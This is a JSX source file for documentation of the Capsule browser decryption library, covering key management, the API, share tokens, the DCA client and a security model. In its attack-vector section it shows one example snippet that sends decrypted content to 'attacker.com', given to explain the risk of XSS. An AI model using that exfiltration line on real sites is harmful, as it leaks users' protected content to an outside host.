import { CodeBlock } from "@/components/CodeBlock";
import { PageWithToc } from "@/components/PageWithToc";

export default function ClientPage() {
  return (
    <PageWithToc>
      <main className="content-page">
        <h1>Client Integration</h1>
        <p>
          The Capsule client is a lightweight browser library that handles key
          management, content key caching, and content decryption using the Web Crypto
          API.
        </p>

        <h2>Installation</h2>
        <CodeBlock language="bash">{`npm install @sesamy/capsule`}</CodeBlock>

        <h2>Quick Start (High-Level API)</h2>
        <p>
          The simplest way to use Capsule - just provide an unlock function and
          the client handles everything automatically:
        </p>
        <ul>
          <li>
            <strong>Key generation</strong> - RSA key pairs created on-demand
          </li>
          <li>
            <strong>content key caching</strong> - encrypted DEKs stored for reuse
          </li>
          <li>
            <strong>Auto-renewal</strong> - time-perioded keys are automatically
            renewed before expiry
          </li>
          <li>
            <strong>Script execution</strong> - <code>&lt;script&gt;</code> tags
            in decrypted HTML are executed (browsers don&apos;t run scripts
            inserted via innerHTML)
          </li>
        </ul>
        <CodeBlock>{`import { CapsuleClient } from '@sesamy/capsule';

// Initialize with an unlock function
const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedContentKey, publicKey, resourceId }) => {
    // Call your server to get the encrypted DEK
    const res = await fetch('/api/unlock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keyId, wrappedContentKey, publicKey }),
    });
    return res.json(); // { encryptedContentKey, expiresAt, periodId }
  }
});

// Unlock an article - keys auto-created if needed!
const content = await capsule.unlock(encryptedArticle);

// Or unlock by element ID (finds data-capsule attribute)
await capsule.unlockElement('article-123');

// Or process all encrypted elements on page
await capsule.processAll();`}</CodeBlock>

        <h3>Example: Encrypted Content with Embedded Script</h3>
        <p>
          When content is decrypted, any <code>&lt;script&gt;</code> tags are
          automatically executed. This enables interactive premium content:
        </p>
        <CodeBlock language="html">{`<!-- This is what your encrypted content might look like when decrypted -->
<article class="premium-content">
  <h2>🎉 Welcome, Premium Member!</h2>
  <p>You've unlocked exclusive content.</p>
  
  <script>
    // This script runs after decryption!
    const container = document.currentScript.parentElement;
    const confetti = ['🎊', '✨', '🌟', '💫', '🎉'];
    
    for (let i = 0; i < 20; i++) {
      const span = document.createElement('span');
      span.textContent = confetti[Math.floor(Math.random() * confetti.length)];
      span.style.cssText = \`
        position: fixed;
        font-size: 24px;
        animation: fall 3s ease-in forwards;
        left: \${Math.random() * 100}vw;
        top: -30px;
        z-index: 1000;
      \`;
      document.body.appendChild(span);
      setTimeout(() => span.remove(), 3000);
    }
    
    // Add a dynamic timestamp
    const time = document.createElement('p');
    time.innerHTML = '<em>Unlocked at: ' + new Date().toLocaleTimeString() + '</em>';
    container.appendChild(time);
  </script>
</article>`}</CodeBlock>

        <h2>Auto-Processing with Events</h2>
        <p>
          Enable <code>autoProcess</code> to automatically unlock all encrypted
          elements on page load:
        </p>
        <CodeBlock>{`const capsule = new CapsuleClient({
  unlock: myUnlockFunction,
  autoProcess: true,  // Process on page load
  executeScripts: true,  // Execute <script> in decrypted content
});

// Listen for unlock events
document.addEventListener('capsule:unlock', (e) => {
  console.log('Unlocked:', e.detail.resourceId);
  console.log('Content:', e.detail.content.substring(0, 100));
});

document.addEventListener('capsule:error', (e) => {
  console.error('Failed:', e.detail.error);
});

document.addEventListener('capsule:state', (e) => {
  console.log('State changed:', e.detail.previousState, '→', e.detail.state);
});

document.addEventListener('capsule:ready', (e) => {
  console.log('Capsule ready, public key:', e.detail.publicKey);
});`}</CodeBlock>

        <h2>HTML Markup</h2>
        <p>
          Add encrypted content with the <code>data-capsule</code> attribute:
        </p>
        <CodeBlock language="html">{`<div 
  id="premium-content"
  data-capsule='{"resourceId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
  data-capsule-id="abc123"
>
  <p>Loading encrypted content...</p>
</div>`}</CodeBlock>

        <h2>Configuration Options</h2>
        <CodeBlock>{`interface CapsuleClientOptions {
  // Required for automatic unlocking
  unlock?: UnlockFunction;    // Async function to fetch encrypted DEK

  // Key settings
  keySize?: 2048 | 4096;      // RSA key size (default: 2048)

  // Processing behavior
  autoProcess?: boolean;      // Auto-process elements on init (default: false)
  executeScripts?: boolean;   // Execute <script> tags (default: true)
  selector?: string;          // CSS selector (default: '[data-capsule]')

  // content key caching
  contentKeyStorage?: 'memory' | 'session' | 'persist';  // (default: 'persist')
  renewBuffer?: number;       // Ms before expiry to auto-renew (default: 5000)

  // IndexedDB settings
  dbName?: string;            // Database name (default: 'capsule-keys')
  storeName?: string;         // Store name (default: 'keypair')

  // Debugging
  logger?: (msg, level) => void;
}`}</CodeBlock>

        <h2>API Reference</h2>

        <h3>High-Level Methods</h3>

        <h4>getPublicKey()</h4>
        <p>
          Get the user's public key.{" "}
          <strong>Creates keys automatically if they don't exist.</strong>
        </p>
        <CodeBlock>{`const publicKey = await capsule.getPublicKey();
// Returns: Base64-encoded SPKI public key`}</CodeBlock>

        <h4>unlock(article, preferredKeyType?)</h4>
        <p>
          Decrypt an encrypted article using cached content key or by fetching a new
          one.
        </p>
        <CodeBlock>{`const content = await capsule.unlock(encryptedArticle, 'shared');
// Returns: Decrypted content as string`}</CodeBlock>

        <h4>unlockElement(resourceId)</h4>
        <p>Find an element by article ID, decrypt, and render content.</p>
        <CodeBlock>{`await capsule.unlockElement('article-123');
// Finds element with data-capsule-id="article-123"
// Decrypts and replaces innerHTML`}</CodeBlock>

        <h4>processAll()</h4>
        <p>Process all encrypted elements on the page.</p>
        <CodeBlock>{`const results = await capsule.processAll();
// Returns: Map<resourceId, content | Error>`}</CodeBlock>

        <h4>tryUnlockFromCache(article, preferredKeyType?)</h4>
        <p>
          Try to unlock using only locally-cached keys (no server call).
          Returns decrypted content or <code>null</code> if no cached key is
          available. Useful for restoring previously unlocked content on page
          load without a network round-trip.
        </p>
        <CodeBlock>{`const cached = await capsule.tryUnlockFromCache(article);
if (cached) {
  showContent(cached);
} else if (capsule.hadExpiredKeys) {
  // Returning user with expired keys — auto-renew
  const content = await capsule.unlock(article, capsule.expiredKeyType ?? 'shared');
  showContent(content);
} else {
  showPaywall();
}`}</CodeBlock>

        <h4>hadExpiredKeys / expiredKeyType</h4>
        <p>
          Read-only getters available after calling{" "}
          <code>tryUnlockFromCache()</code>. Use them to distinguish
          &ldquo;first visit&rdquo; (no keys) from &ldquo;returning user with
          expired keys&rdquo; so the UI can auto-renew.
        </p>
        <CodeBlock>{`capsule.hadExpiredKeys;   // boolean — were expired keys found?
capsule.expiredKeyType;  // 'shared' | 'article' | null`}</CodeBlock>

        <h4>prefetchSharedKey(keyId)</h4>
        <p>
          Pre-fetch and cache a shared key-encrypting key (KEK). After calling
          this, all articles encrypted for the same content ID can be unlocked
          locally without additional server round-trips.
        </p>
        <CodeBlock>{`// Pre-fetch shared key from first article
const sharedKey = articles[0].wrappedKeys.find(
  k => !k.keyId.startsWith('article:')
);
if (sharedKey) {
  await capsule.prefetchSharedKey(sharedKey.keyId);
}
// Now all unlocks for this content ID are local
for (const article of articles) {
  await capsule.unlock(article);
}`}</CodeBlock>

        <h4>getElementState(resourceId)</h4>
        <p>
          Get the current processing state of an encrypted element.
        </p>
        <CodeBlock>{`const state = capsule.getElementState('article-123');
// Returns: 'locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error' | undefined`}</CodeBlock>

        <h3>Low-Level Methods</h3>

        <h4>decrypt(article, encryptedContentKey)</h4>
        <p>
          Decrypt with a pre-fetched encrypted DEK. For full manual control.
        </p>
        <CodeBlock>{`const publicKey = await capsule.getPublicKey();
const { encryptedContentKey } = await myServerCall(publicKey, wrappedKey);
const content = await capsule.decrypt(encryptedArticle, encryptedContentKey);`}</CodeBlock>

        <h4>decryptPayload(payload)</h4>
        <p>Decrypt a simple single-key payload (no envelope encryption).</p>
        <CodeBlock>{`const content = await capsule.decryptPayload({
  encryptedContent: 'base64...',
  iv: 'base64...',
  encryptedContentKey: 'base64...'
});`}</CodeBlock>

        <h4>hasKeyPair() / getKeyInfo() / regenerateKeyPair() / clearAll()</h4>
        <p>Utility methods for key management.</p>
        <CodeBlock>{`const exists = await capsule.hasKeyPair();
const info = await capsule.getKeyInfo(); // { keySize, createdAt }
const newKey = await capsule.regenerateKeyPair();
await capsule.clearAll(); // Remove all keys and cached content keys`}</CodeBlock>

        <h2>React Integration</h2>
        <CodeBlock>{`import { useState, useEffect, useRef } from 'react';
import { CapsuleClient, UnlockFunction, EncryptedArticle } from '@sesamy/capsule';

export function useEncryptedContent(encryptedData: EncryptedArticle | null) {
  const [content, setContent] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const clientRef = useRef<CapsuleClient | null>(null);

  useEffect(() => {
    // Initialize client once
    const unlock: UnlockFunction = async (params) => {
      const res = await fetch('/api/unlock', {
        method: 'POST',
        body: JSON.stringify(params),
      });
      return res.json();
    };

    clientRef.current = new CapsuleClient({ unlock });
  }, []);

  const handleUnlock = async () => {
    if (!clientRef.current || !encryptedData) return;
    
    setIsLoading(true);
    setError(null);
    
    try {
      const decrypted = await clientRef.current.unlock(encryptedData);
      setContent(decrypted);
    } catch (err) {
      setError(err instanceof Error ? err : new Error('Unlock failed'));
    } finally {
      setIsLoading(false);
    }
  };

  return { content, isLoading, error, handleUnlock };
}

// Usage
function Article({ encryptedData }) {
  const { content, isLoading, error, handleUnlock } = useEncryptedContent(encryptedData);

  if (content) return <div dangerouslySetInnerHTML={{ __html: content }} />;
  if (isLoading) return <p>Unlocking...</p>;
  if (error) return <p>Error: {error.message}</p>;
  
  return <button onClick={handleUnlock}>Unlock</button>;
}`}</CodeBlock>

        <h2>DEK Storage Modes</h2>
        <p>
          Control how decrypted DEKs are cached for performance and offline
          access:
        </p>
        <table
          style={{
            width: "100%",
            borderCollapse: "collapse",
            marginTop: "1rem",
          }}
        >
          <thead>
            <tr>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Mode
              </th>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Storage
              </th>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Persistence
              </th>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Use Case
              </th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                <code>'memory'</code>
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                JavaScript
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Page refresh
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Maximum security
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                <code>'session'</code>
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                sessionStorage
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Tab close
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Balance security/UX
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                <code>'persist'</code>
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                IndexedDB
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Browser restart
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Best offline support
              </td>
            </tr>
          </tbody>
        </table>
        <p style={{ marginTop: "0.5rem", fontSize: "0.9rem", opacity: 0.8 }}>
          Note: DEKs are stored <strong>encrypted</strong> with the user's
          public key. They must be unwrapped using the private key each time
          (which never leaves the browser's crypto subsystem).
        </p>

        <h2>Share Link Token Handling</h2>
        <p>
          The client library provides utilities for working with DCA share link
          tokens — publisher-signed ES256 JWTs that grant access to specific
          content without a subscription.
        </p>

        <h3>Auto-Detecting Share Tokens from URL</h3>
        <p>
          Use the static <code>getShareTokenFromUrl()</code> helper to check if
          the current URL contains a share token:
        </p>
        <CodeBlock>{`import { DcaClient } from '@sesamy/capsule';

// Reads ?share= from the current URL (default param name)
const shareToken = DcaClient.getShareTokenFromUrl();

// Or use a custom parameter name
const shareToken = DcaClient.getShareTokenFromUrl('token');`}</CodeBlock>

        <h3>Unlocking with a Share Token</h3>
        <p>
          Call <code>unlockWithShareToken()</code> instead of the normal{" "}
          <code>unlock()</code>. The share token is included in the unlock
          request body so the issuer can validate it:
        </p>
        <CodeBlock>{`import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();
const page = client.parsePage();

const shareToken = DcaClient.getShareTokenFromUrl();
if (shareToken) {
  // Unlock using share token as authorization
  const keys = await client.unlockWithShareToken(page, "sesamy", shareToken);
  const html = await client.decrypt(page, "bodytext", keys);
  document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;
  
  // Clean the share token from the URL (cosmetic)
  const url = new URL(window.location.href);
  url.searchParams.delete("share");
  history.replaceState({}, "", url);
}`}</CodeBlock>

        <h3>How It Works Under the Hood</h3>
        <p>
          <code>unlockWithShareToken()</code> is a convenience wrapper around{" "}
          <code>unlock()</code>. It adds the <code>shareToken</code> field to the
          unlock request body so the issuer knows to use share-link authorization
          instead of subscription checks:
        </p>
        <CodeBlock>{`// What unlockWithShareToken sends to the issuer:
POST /api/unlock
{
  "resource": { "domain": "...", "resourceId": "..." },
  "resourceJWT": "eyJ…",
  "issuerJWT": "eyJ…",
  "sealed": { "bodytext": { … } },
  "keyId": "issuer-key-1",
  "issuerName": "sesamy",
  "shareToken": "eyJ…"    // ← Share link token added here
}

// The issuer verifies the share token signature (ES256, publisher-signed),
// validates claims (domain, resourceId, expiry, contentNames),
// then unseals keys from the normal DCA sealed data.
// No periodSecret needed — keys flow through the normal DCA channel.`}</CodeBlock>

        <h3>Security Notes</h3>
        <ul>
          <li>
            The share token is an opaque ES256 JWT signed by the publisher —
            the client does not verify its signature (the issuer does that)
          </li>
          <li>
            The token carries no key material — it is purely an authorization
            grant
          </li>
          <li>
            Tokens are bearer credentials: anyone with the URL has access until
            expiry
          </li>
          <li>
            The issuer validates the token against its trusted-publisher key
            allowlist — no new secrets needed
          </li>
        </ul>

        <h2>Security Model</h2>

        <h3>Private Key Protection: The Core Guarantee</h3>
        <p>
          The Capsule client's security foundation is that{" "}
          <strong>the private key cannot be extracted from the browser</strong>,
          even by the user or malicious JavaScript code.
        </p>

        <h4>How Non-Extractable Keys Work</h4>
        <p>
          When generating a key pair, the private key is stored with{" "}
          <code>extractable: false</code>:
        </p>
        <CodeBlock>{`const privateKey = await crypto.subtle.importKey(
  'jwk',
  privateKeyJwk,
  { name: 'RSA-OAEP', hash: 'SHA-256' },
  false,  // NOT extractable - enforced by browser engine
  ['unwrapKey']
);`}</CodeBlock>

        <p>This means:</p>
        <ul>
          <li>
            ✅ The key can be <strong>used</strong> for unwrapping DEKs
          </li>
          <li>
            ❌ The key cannot be <strong>exported</strong> in any format (JWK,
            PKCS8, raw bytes)
          </li>
          <li>
            ❌ The key cannot be <strong>copied</strong> to another device or
            browser
          </li>
          <li>
            ❌ The key cannot be <strong>downloaded</strong> or sent to a server
          </li>
        </ul>

        <h4>What About IndexedDB Access?</h4>
        <p>
          Users and JavaScript code <strong>can access IndexedDB</strong>{" "}
          through DevTools or browser APIs:
        </p>
        <CodeBlock>{`// You CAN retrieve the key object
const db = await indexedDB.open('capsule-keys');
const keyPair = await db.get('keypair', 'default');
console.log(keyPair.privateKey); 
// Output: CryptoKey {type: "private", extractable: false, ...}

// But you CANNOT export the key material
await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// ❌ Error: "key is not extractable"

await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
// ❌ Error: "key is not extractable"

// Even this doesn't help
JSON.stringify(keyPair.privateKey);
// Returns: "{}" (empty object)

const blob = new Blob([keyPair.privateKey]);
// Creates: "[object CryptoKey]" (useless string)`}</CodeBlock>

        <p>
          The <code>CryptoKey</code> object in IndexedDB is just a{" "}
          <strong>handle</strong> or <strong>reference</strong> to the actual
          key material, which lives in the browser's secure crypto subsystem.
          Think of it like a key to a safe deposit box that only works inside
          the bank - you can use it there, but you can't take the contents home.
        </p>

        <h4>Attack Vector Analysis</h4>
        <table
          style={{
            width: "100%",
            borderCollapse: "collapse",
            marginTop: "1rem",
          }}
        >
          <thead>
            <tr>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Attack Type
              </th>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Can Extract Key?
              </th>
              <th
                style={{
                  textAlign: "left",
                  padding: "0.5rem",
                  borderBottom: "1px solid #ddd",
                }}
              >
                Notes
              </th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Server compromise
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Key never sent to server
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Network interception
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Key never transmitted
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                XSS / malicious JS
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Can use key, cannot export it
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Browser DevTools
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Can see object, not bytes
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Database breach
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                No server-side key storage
              </td>
            </tr>
            <tr>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                User manual export
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                ❌ No
              </td>
              <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
                Browser prevents all export methods
              </td>
            </tr>
          </tbody>
        </table>

        <p style={{ marginTop: "1rem" }}>
          The <strong>only</strong> attack that works is using the key for its
          intended purpose:
        </p>
        <CodeBlock>{`// Malicious code CAN do this:
const decryptedContent = await client.unlock(article);
await fetch('https://attacker.com', { 
  method: 'POST', 
  body: decryptedContent  // Send decrypted content (not the key!)
});`}</CodeBlock>

        <p>
          This is why <strong>XSS protection</strong> (Content Security Policy,
          input sanitization) remains critical - not to protect the key itself,
          but to prevent unauthorized <strong>use</strong> of the key.
        </p>

        <h3>Additional Security Layers</h3>
        <ul>
          <li>
            <strong>DEKs in Memory Only</strong>: Unwrapped content keys are cached in
            JavaScript memory (not persisted) and lost on page refresh
          </li>
          <li>
            <strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent
            tampering with encrypted content
          </li>
          <li>
            <strong>Web Crypto API</strong>: Uses hardware-accelerated
            cryptography when available (TPM, Secure Enclave)
          </li>
          <li>
            <strong>Secure Context Requirement</strong>: Web Crypto API only
            works over HTTPS or localhost
          </li>
          <li>
            <strong>Origin Isolation</strong>: IndexedDB is bound to the origin
            - other websites cannot access your keys
          </li>
        </ul>

        <h3>What This Means for Your Application</h3>
        <ul>
          <li>
            ✅ <strong>Server compromise cannot leak user keys</strong> -
            They're not on the server
          </li>
          <li>
            ✅ <strong>Database breach cannot decrypt content</strong> - Private
            keys are client-side only
          </li>
          <li>
            ✅ <strong>Network eavesdropping is ineffective</strong> - Only
            wrapped content keys are transmitted
          </li>
          <li>
            ✅ <strong>Users cannot accidentally export their keys</strong> -
            Browser prevents it
          </li>
          <li>
            ✅ <strong>True end-to-end encryption</strong> - Only the user's
            browser can decrypt
          </li>
        </ul>

        <h3>Limitations and Trade-offs</h3>
        <ul>
          <li>
            ⚠️ <strong>Key loss means data loss</strong>: If a user clears
            browser data or switches devices, they lose access
          </li>
          <li>
            ⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single
            browser profile
          </li>
          <li>
            ⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can
            decrypt content (though not steal keys)
          </li>
        </ul>

        <p>Consider implementing:</p>
        <ul>
          <li>Server-side encrypted key backup (wrapped with user password)</li>
          <li>
            Multi-device key synchronization (using secure key exchange
            protocols)
          </li>
          <li>Content Security Policy (CSP) to prevent XSS attacks</li>
        </ul>

        <h2>DCA Client</h2>
        <p>
          The package also exports a <code>DcaClient</code> for Distributed
          Content Access — a protocol where publishers embed encrypted content
          and key metadata directly in the HTML and keys are obtained from
          issuer endpoints.
        </p>

        <h3>Quick Start</h3>
        <CodeBlock>{`import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();

// Parse DCA data from the current page
const page = client.parsePage();

// Unlock via an issuer
const keys = await client.unlock(page, 'sesamy');

// Decrypt a specific content item
const html = await client.decrypt(page, 'bodytext', keys);

// Inject into the DOM
document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;

// Or decrypt everything at once
const all = await client.decryptAll(page, keys);
for (const [name, content] of Object.entries(all)) {
  document.querySelector(\`[data-dca-content-name="\${name}"]\`)!.innerHTML = content;
}`}</CodeBlock>

        <h3>HTML Structure</h3>
        <p>
          DCA pages contain a <code>&lt;script class=&quot;dca-data&quot;&gt;</code>{" "}
          element with encrypted metadata and a{" "}
          <code>&lt;template class=&quot;dca-sealed-content&quot;&gt;</code>{" "}
          element holding the sealed content blocks:
        </p>
        <CodeBlock language="html">{`<!-- DCA metadata -->
<script class="dca-data" type="application/json">
{
  "version": "1.0",
  "resource": { "resourceId": "article-123", "..." : "..." },
  "resourceJWT": "eyJ...",
  "issuerJWT": { "sesamy": "eyJ..." },
  "contentSealData": {
    "bodytext": { "contentType": "text/html", "nonce": "...", "aad": "..." }
  },
  "sealedContentKeys": { "..." : "..." },
  "issuerData": {
    "sesamy": { "unlockUrl": "https://api.sesamy.com/unlock", "..." : "..." }
  }
}
</script>

<!-- Sealed content -->
<template class="dca-sealed-content">
  <div data-dca-content-name="bodytext">BASE64URL_CIPHERTEXT</div>
</template>`}</CodeBlock>

        <h3>Configuration</h3>
        <CodeBlock>{`interface DcaClientOptions {
  // Custom fetch function (e.g. to add auth headers)
  fetch?: typeof globalThis.fetch;

  // Custom unlock function — replaces the default fetch-based unlock
  unlockFn?: (unlockUrl: string, body: unknown) => Promise<DcaUnlockResponse>;

  // Period key cache for reusing keys across pages
  periodKeyCache?: {
    get(key: string): Promise<string | null>;
    set(key: string, value: string): Promise<void>;
  };
}`}</CodeBlock>

        <h3>API Reference</h3>

        <h4>parsePage(root?)</h4>
        <p>Parse DCA data and sealed content from the DOM.</p>
        <CodeBlock>{`const page = client.parsePage();
// Or from a specific container
const page = client.parsePage(document.getElementById('article'));`}</CodeBlock>

        <h4>parseJsonResponse(json)</h4>
        <p>Parse DCA data from a JSON API response instead of the DOM.</p>
        <CodeBlock>{`const res = await fetch('/api/article/123');
const page = client.parseJsonResponse(await res.json());`}</CodeBlock>

        <h4>unlock(page, issuerName, additionalBody?)</h4>
        <p>
          Request key material from an issuer&apos;s unlock endpoint. Pass
          extra fields (e.g. auth tokens) via <code>additionalBody</code>.
        </p>
        <CodeBlock>{`const keys = await client.unlock(page, 'sesamy', {
  authToken: 'Bearer ...',
});`}</CodeBlock>

        <h4>decrypt(page, contentName, unlockResponse)</h4>
        <p>
          Decrypt a single content item. Supports both direct content keys and
          period-key wrapping.
        </p>
        <CodeBlock>{`const html = await client.decrypt(page, 'bodytext', keys);`}</CodeBlock>

        <h4>decryptAll(page, unlockResponse)</h4>
        <p>Decrypt all content items and return a name → content map.</p>
        <CodeBlock>{`const results = await client.decryptAll(page, keys);
// { bodytext: '<p>...</p>', sidebar: '<div>...</div>' }`}</CodeBlock>

        <h3>Period Key Caching</h3>
        <p>
          DCA supports time-bucketed period keys that can decrypt content keys
          locally. Provide a cache to reuse them across page navigations:
        </p>
        <CodeBlock>{`// Simple sessionStorage-based cache
const cache = {
  async get(key: string) {
    return sessionStorage.getItem(key);
  },
  async set(key: string, value: string) {
    sessionStorage.setItem(key, value);
  },
};

const client = new DcaClient({ periodKeyCache: cache });

// First page: keys fetched from issuer, periodKeys cached
const page1 = client.parsePage();
const keys1 = await client.unlock(page1, 'sesamy');
await client.decrypt(page1, 'bodytext', keys1);

// Next page: if the same period is active, no server call needed
const page2 = client.parsePage();
const keys2 = await client.unlock(page2, 'sesamy');
await client.decrypt(page2, 'bodytext', keys2); // Uses cached periodKey`}</CodeBlock>

        <h2>Browser Compatibility</h2>
        <p>Capsule requires the Web Crypto API, which is available in:</p>
        <ul>
          <li>✅ Chrome 37+</li>
          <li>✅ Firefox 34+</li>
          <li>✅ Safari 11+</li>
          <li>✅ Edge 79+</li>
        </ul>
        <p>
          Note: Web Crypto API is only available in secure contexts (HTTPS or
          localhost).
        </p>
      </main>
    </PageWithToc>
  );
}
